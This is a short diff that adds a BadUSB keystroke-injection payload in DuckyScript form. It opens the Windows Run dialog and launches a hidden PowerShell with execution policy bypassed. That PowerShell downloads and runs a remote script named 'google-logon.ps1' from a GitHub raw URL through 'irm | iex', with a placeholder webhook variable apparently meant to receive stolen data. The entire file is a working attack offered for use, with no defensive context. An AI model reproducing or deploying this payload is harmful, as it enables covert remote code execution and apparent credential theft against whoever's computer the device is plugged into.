@@ -1,0 +1,10 @@
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -w h -NoP -Ep Bypass -C $dc='webhook_here';irm https://raw.githubusercontent.com/mbeskek/flips/main/google-logon.ps1 | iex
+ENTER
+
+
